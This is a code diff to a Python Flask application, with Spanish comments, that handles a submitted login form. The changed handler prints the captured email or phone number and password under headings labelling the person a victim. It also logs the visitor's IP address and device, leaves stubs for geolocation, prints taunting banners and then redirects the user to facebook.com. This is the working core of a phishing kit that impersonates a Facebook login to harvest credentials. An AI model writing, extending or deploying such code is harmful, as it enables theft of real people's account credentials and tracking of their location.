@@ -90,13 +90,30 @@ def submit_form():
     email = request.form['email']
     password = request.form['password']
 
-    # Imprimir los datos en la terminal
-    print(f"Correo electrónico o teléfono: {email}")
-    print(f"Contraseña: {password}")
+    # Limpiar la terminal
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+    # Mostrar los datos en el formato especificado
+    print("\n𝐂𝐎𝐑𝐑𝐄𝐎 𝐄𝐋𝐄𝐂𝐓𝐑Ó𝐍𝐈𝐂𝐎/𝐍Ú𝐌𝐄𝐑𝐎 𝐃𝐄 𝐓𝐄𝐋É𝐅𝐎𝐍𝐎 𝐃𝐄 𝐋𝐀 𝐕𝐈𝐂𝐓𝐈𝐌𝐀.---")
+    print(f"{email}\n")
+    print("𝐂𝐎𝐍𝐓𝐑𝐀𝐒𝐄Ñ𝐀.---")
+    print(f"{password}\n")
+    print("𝐈𝐏.---")
+    print(f"{request.remote_addr}\n")
+    print("𝐃𝐈𝐒𝐏𝐎𝐒𝐈𝐓𝐈𝐕𝐎.---")
+    print(f"{request.user_agent.platform}\n")
+    print("𝐏𝐀𝐈𝐒.---")
+    print("Por implementar")  # Aquí se puede implementar el uso de una API de geolocalización si es necesario.
+    print("\n𝐂𝐈𝐔𝐃𝐀𝐃.---")
+    print("Por implementar")
+    print("\n𝐂𝐎𝐃𝐈𝐆𝐎 𝐏𝐎𝐒𝐓𝐀𝐋.---")
+    print("Por implementar\n")
+    print("🤬𝑫𝚯𝚭𝚭𝚬𝑅來𝚳𝚾〽️\n")
+    print("☠️𝐃𝐎𝐌𝐈𝐍𝐀.\n")
 
     # Redirigir al usuario a Facebook
     return redirect('https://www.facebook.com')
-
+    
 # Configuración para servir archivos estáticos (CSS)
 @app.route('/static/<path:filename>')
 def static_files(filename):
